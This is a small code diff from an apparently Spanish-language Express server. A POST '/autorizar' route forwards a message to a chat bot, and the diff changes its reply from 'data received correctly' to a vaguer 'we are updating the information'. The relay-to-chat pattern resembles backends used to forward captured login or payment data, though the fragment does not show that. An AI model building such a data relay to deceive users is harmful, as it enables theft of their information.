@@ -54,7 +54,7 @@ app.post("/autorizar", async (req, res) => {
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    res.json({ status: "Datos recibidos correctamente", mensaje });
+    res.json({ status: "Estamos actualizando la información", mensaje });
   } catch (err) {
     res.status(500).json({ status: "error", error: err.message });
   }
